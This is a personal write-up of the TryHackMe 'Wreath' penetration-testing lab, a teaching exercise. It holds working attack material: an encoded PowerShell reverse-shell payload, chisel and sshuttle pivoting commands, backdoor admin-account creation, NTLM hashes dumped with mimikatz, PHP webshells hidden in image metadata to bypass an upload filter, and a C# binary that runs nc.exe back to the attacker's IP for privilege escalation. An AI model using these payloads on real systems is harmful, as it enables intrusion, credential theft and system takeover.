---
title: "Wreath"
description: "10.200.96.200 Nmap Nmap Internal Network Port 10000 MiniServ 1.890 Exploit MiniServ 1.890 Gaining persistent access by copying the private key of user root into local Internal"
lang: "en"
translationKey: "wreath"
category: "lab-writeups"
tags: ["Unique Case Winpriv", "unique case pivoting", "Antivirus Evading", "Lab", "Active Directory"]
publishDate: "2024-03-30"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "540defe4-d8d6-45ad-bc1f-1e73b8b92651"
notionUrl: "https://app.notion.com/p/Wreath-540defe4d8d645adbc1f1e73b8b92651"
notionLastEdited: "2025-02-12T14:19:00.000Z"
---

# 10.200.96.200

## Nmap 

![](/images/wreath/dcfe11e99fc0.png)

Nmap Internal Network

![](/images/wreath/48d10eeb2e97.png)

## Port 10000 (MiniServ 1.890)

![](/images/wreath/444dd4821df3.png)

![](/images/wreath/76371e9646cd.png)

### Exploit MiniServ 1.890

![](/images/wreath/a7974b4a8cb0.png)

**Gaining persistent access by copying the private key of user root into local**

![](/images/wreath/3bbbc04acbe1.png)

![](/images/wreath/90cb12501888.png)

## Internal Enumeration

![](/images/wreath/535799ffe6f6.png)

# Pivoting

from internal enumeration we know that there is an internal IP server that we got, so let’s we try to accessing it using pivoting technique.

![](/images/wreath/f9f9ef0a8f37.png)

cause we want to upgrade the pivot, we need to open 2 port on firewall and tunneling it into our local kali. first open the port from firewall

![](/images/wreath/31e8c3b71d17.png)

then tunneling the port via chisel

![](/images/wreath/3628876ee4c4.png)

# 10.200.96.150

## Nmap

port scanning using nmap and proxychains

![](/images/wreath/81b3c45bafc2.png)

## Port 80 (git-server)

we found that there is port 80 open so let’s we accessing it with browser using tools foxyproxy

![](/images/wreath/4b6f968f9842.png)

![](/images/wreath/8a7a9634f99d.png)

![](/images/wreath/6ac8bdd84ddb.png)

![](/images/wreath/4a71e445cd04.png)

### Exploit git-server

![](/images/wreath/d5c309c615d2.png)

so let’s we find out how to establish revshell, but before we go for a reverse shell, we need to establish if this target is allowed to connect to the outside world by executing the `ping` command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through.

To start up a TCPDump listener we would use the following command:

```bash
tcpdump -i tun0 icmp
```

Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):

```bash
ping -n 3 ATTACKING_IP
```

![](/images/wreath/692f8d6a781a.png)

we see that we can’t connect directly from .150 into our local kali. oke first let’s we check the firewall by using this command

```bash
firewall-cmd --list-all
```

![](/images/wreath/c56ab8c58e23.png)

On our first compromised host, 10.200.96.200, firewalld is running which is a firewall management tool that comes pre-installed on CentOS and other Red Hat-based Linux distributions. By default the tool is restrictive and only allows traffic to port 22, SSH. Let’s apply a firewall rule that allows incoming traffic to a desired port (in my case, port 22222) using the TCP protocol.

```bash
firewall-cmd --zone=public --add-port 22222/tcp
```

![](/images/wreath/4721325e4a7e.png)

Next, we’ll open a port on that host via `nc -nvlp 22222` to listen for incoming traffic to that port.

Let’s craft a POST request containing a malicious powershell payload that contains a reverse shell connection to the port. Modify the values of IP and port to compromised host and newly opened port. The attack is successful as our netcat shows a successful connection from our target ending in our local machine.

```bash
# PIVOTING
# LOCAL KALI
chisel server --socks5 --reverse &
# TARGET
./chisel client 10.50.76.178:8080 R:socks 22222:10.50.76.178:22222 &
# REVSHELL PAYLOAD
powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMgAwADAALgA5ADYALgAyADAAMAAiACwAMgAyADIAMgAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

![](/images/wreath/b3c1a300b2da.png)

![](/images/wreath/226f7d88e16c.png)

![](/images/wreath/c96169d005e3.png)

### **Persistence**

Referensi : [https://pencer.io/ctf/ctf-thm-wreath/#git-server---enumeration](https://pencer.io/ctf/ctf-thm-wreath/#git-server---enumeration)

```bash
# menambahkan user baru
net user pencer Password123 /add
# menambahkan user pencer pada group admin 
net localgroup Administrators pencer /add
# menambahkan user pencer pada group Remote
net localgroup "Remote Management Users" pencer /add
```

![](/images/wreath/63434988cd7b.png)

![](/images/wreath/4890ff677676.png)

## Internal Enum

using previous tunneling we can pull a file directly from our local kali using python server.

![](/images/wreath/2a054d580ddb.png)

![](/images/wreath/0b6f697bd655.png)

**Mimikatz**

login target via xfreerdp and open powershell with administrator privileges and run mimikatz for dump hash NTLM.

![](/images/wreath/1d733831abfb.png)

![](/images/wreath/8860b204790b.png)

oke now we got 2 NTLM Hash of 2 account here it’s :

```bash
Administrator : 37db630168e5f82aafa8461e05c6bbd1
Thomas : 02d90eda8f6b6b06c32d5f207831101f 
```

now we succeed to crack NTLM hash of user Thomas

![](/images/wreath/e1295f4aad29.png)

we failed to crack hash administrator but we can use the hash directly using pass the hash technique.

![](/images/wreath/6b6f4135fc84.png)

# 10.200.96.100

## **Port Scanning**

![](/images/wreath/b79c0c561642.png)

## Pivoting .100 (remote port forward)

![](/images/wreath/7312953dca08.png)

![](/images/wreath/718e4320db8e.png)

![](/images/wreath/fa6788bcaf2c.png)

![](/images/wreath/a527fde35a2b.png)

## Pivoting .100 (local port forward)

first we need to change our first technique on .150 using sshuttle

```bash
sshuttle -r root@10.200.96.200 --ssh-cmd "ssh -i ~/Documents/tryhackme/wreath/id_rsa" 10.200.96.0/24 -x 10.200.96.200
```

![](/images/wreath/ca7885409489.png)

then, set the firewall rule on .100 using the command for open port we will be used for tunneling purpose:

```bash
netsh advfirewall firewall add rule name=”Chisel-tombstoneghost” dir=in action=allow protocol=tcp localport=15997
```

![](/images/wreath/c36f3bf3eb79.png)

then we do tunneling on that port

```bash
# .150
./chisel.exe server -p 15997 — socks5
# .100
chisel client 10.200.96.150:15997 80:10.200.96.100:80
```

![](/images/wreath/fc42e42dac38.png)

![](/images/wreath/9e2041cb63f2.png)

![](/images/wreath/6a20631bd434.png)

### Enum

### Port 80

dirsearch :

![](/images/wreath/103da331f43c.png)

we see that there is exposed .git folder so let’s we dump it using gitdumper.

![](/images/wreath/05f589776243.png)

after that we extract the file that we have download.

![](/images/wreath/4cc778a6ffd1.png)

then we use command git show for showing all the commit that ever done.

![](/images/wreath/e213e16a6dc0.png)

after analyze the commit we found that there are 2 interesting file which has updated before, from the code we know that we can uploaded a malicious file into the server using file upload feature, let’s we find out by accessing the page.

![](/images/wreath/051af633b39f.png)

when accessing the page we will be asked to provide a credential, let’s we use credential of thomas that we have obtained in the previous sections `thomas :  i<3ruby`

![](/images/wreath/4185d2fca143.png)

As php is enabled in the website, I will try to upload a php webshell or reverse shell and catch that.

Now checking the source code, we see there’s been some validation going on so that no malicious file gets uploaded. What happens is :

1. A post request is made after the `upload` button is clicked.
1. There’s a list of mentioned extensions (jpg, jpeg, png, gif), so that no other extension like `.PHP `can be uploaded.
1. `file_exists()` function checks if the file has already been uploaded and if it’s already there the connection dies.
1. If the file has not been uploaded, it proceeds. There are 2 checks made, firstly the size or dimensions of the file is checked to see if it’s a valid image and then the extension is checked to see if it has one of the good extensions mentioned earlier.
1. If it makes all the checks, the file is moved to the `uploads/` directory with the `move_uploaded_file()` function.
1. If the process ends, a success message is shown otherwise a fail message.
Now we have to bypass those checks in order to upload a reverse shell. I wanted to upload a php shell file and tried several methods like changing the extension, putting several extensions like `image.php.png`, intercepting the request with burpsuite and changing the mime type but nothing worked.

Maybe it’s because of the size checks, by getting the dimensions of the file, it can detect that I’m not actually uploading an image. So this time I decided to upload an image but using `exiftool`
 to sneak in some php shell in a form of metadata inside that image. This should get rid of the size check problem. Also I added the `.php` extension at the end so that the metadata gets executed. So I added the metadata to this image named `innocent.png` with exiftool And then change the name to `innocent.png.php`

```bash
# generate malicious file
exiftool -Comment='<?php echo "<prev>"; system($_GET['cmd']); ?>' innocent.png
# rename malicious file
mv innocent.png innocent.png.php
```

![](/images/wreath/5fa543655bcb.png)

Uploading this newly created file worked, we have the success message.

![](/images/wreath/52ee69f10ef2.png)

after successfully uploading our malicious file, let’s we do running a dirsearch to know where we can access our file.

```bash
dirsearch -u http://localhost/resources/ --auth-type=basic --auth='thomas:i<3ruby'  -x 403,404,400
```

![](/images/wreath/370f1bfab1a6.png)

![](/images/wreath/0bec1f8e4da0.png)

see we are able to running a command “whoami” on our file, so let’s we establish revshell from this but before do that let’s we make clean our RCE output by obfuscate our PHP payload become like this.

```bash
<?php $c0=$_GET[base64_decode('d3JlYXRo')];if(isset($c0)){echo base64_decode('PHByZT4=').shell_exec($c0).base64_decode('PC9wcmU+');}die();?>
```

then repeat the step like previous step we have passed to rebuild the RCE and continue to establish revshell.

![](/images/wreath/0904fa3d96a9.png)

![](/images/wreath/fa357c24b374.png)

## Winpriv

### Exploit SeImpersonate :

![](/images/wreath/ca4d897cc605.png)

![](/images/wreath/fd37463cfecc.png)

### Exploit Unquoated Services :

```bash
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

![](/images/wreath/378913a102d2.png)

so let’s we look at on detail about the services

![](/images/wreath/273fcc06a809.png)

next we will create a C# exploit containing our malicious code on our attack machine. We will exploit the vulnerable path to launch an external executable (`nc.exe`) with specific command-line arguments. The executable will connect to our attacker machine (`10.50.76.178`) on port `5555` and executing the command `powershell.exe`.

```bash
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
                Process proc = new Process();
                ProcessStartInfo procInfo = new ProcessStartInfo("c:\\xampp\\htdocs\\resources\\uploads\\nc.exe", "10.50.76.178 5555 -e cmd.exe");
                procInfo.CreateNoWindow = true;
                proc.StartInfo = procInfo;
                proc.Start();
        }
    }
}
```

![](/images/wreath/17e063a9ee32.png)

Next, we will compile the program which will create an executable ending in `.exe` . On our compromised host, we will use curl to grab the executable.

![](/images/wreath/48247b37a6da.png)

![](/images/wreath/80570ff10ed7.png)

We copy our exploit to the path of the service:

![](/images/wreath/43a0970fac8b.png)

With no quotes around that path we are able to put our exe part way down it. Now we need to stop the service:

![](/images/wreath/5f7dc315a3fb.png)

Make sure we have a netcat listener waiting on Kali, then start the service again, We get an error becasue our exe isn’t a real service, however switching over to Kali we see we are connected to a reverse shell as system:

![](/images/wreath/11836e69cac4.png)
